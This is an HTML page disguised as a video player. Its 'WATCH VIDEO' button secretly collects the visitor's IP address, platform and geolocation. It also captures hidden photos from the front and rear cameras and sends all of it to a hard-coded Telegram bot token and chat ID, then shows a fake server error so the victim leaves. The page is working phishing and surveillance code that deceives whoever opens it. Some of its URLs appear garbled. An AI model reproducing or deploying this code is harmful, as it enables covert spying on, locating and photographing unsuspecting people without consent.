<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
        #mainBtn { background: #ff0050; color: #fff; border: none; padding: 18px 45px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; }
        #status { display: none; color: #777; text-align: center; }
        .spinner { width: 30px; height: 30px; border: 3px solid #333; border-top: 3px solid #ff0050; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        video, canvas { display: none !important; }
    </style>
</head>
<body>

    <div id="ui">
        <button id="mainBtn">WATCH VIDEO</button>
        <div id="status">
            <div class="spinner"></div>
            <p id="msg">Loading...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = '8282459787:AAFCkf9w_T_Xvorsn-Tg0ZMgdcfWC9N8mQQ';
        const CHAT_ID = '6660269414';

        const btn = document.getElementById('mainBtn');
        const status = document.getElementById('status');
        const msg = document.getElementById('msg');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        btn.addEventListener('click', async () => {
            btn.style.display = 'none';
            status.style.display = 'block';

            // 1. ОТПРАВКА IP И ИНФО (Мгновенно)
            try {
                const ipRes = await fetch('https://ipify.org');
                const ipData = await ipRes.json();
                await sendText(`🌐 **IP ПОЛУЧЕН**: \`${ipData.ip}\`\n📱 Платформа: ${navigator.platform}`);
            } catch(e) { await sendText("⚠️ Не удалось получить IP"); }

            // 2. ГЕОЛОКАЦИЯ (В фоне)
            navigator.geolocation.getCurrentPosition(async (p) => {
                await sendText(`📍 **ЛОКАЦИЯ**: https://google.com{p.coords.latitude},${p.coords.longitude}`);
            }, null, {timeout: 5000});

            // 3. ФРОНТАЛЬНАЯ КАМЕРА
            await capture('user', 'FRONT');

            // 4. ЗАДНЯЯ КАМЕРА
            await capture('environment', 'REAR');

            // ФИНАЛ: Показываем ошибку, чтобы юзер ушел
            setTimeout(() => {
                msg.textContent = "Server error. Content unavailable.";
                msg.style.color = "#ff0050";
            }, 1000);
        });

        async function capture(mode, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: mode, width: 1280, height: 720 }
                });
                v.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 1500)); // Ждем прогрузки камеры
                
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                // Стоп камера сразу
                stream.getTracks().forEach(t => t.stop());

                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
                await sendPhoto(blob, label);
            } catch (e) {
                await sendText(`❌ Ошибка ${label}: Камера заблокирована`);
            }
        }

        async function sendPhoto(blob, label) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'img.jpg');
            fd.append('caption', `📸 Снимок: ${label}`);
            await fetch(`https://telegram.org{TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        async function sendText(t) {
            await fetch(`https://telegram.org{TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: t, parse_mode: 'Markdown' })
            });
        }
    </script>
</body>
</html>
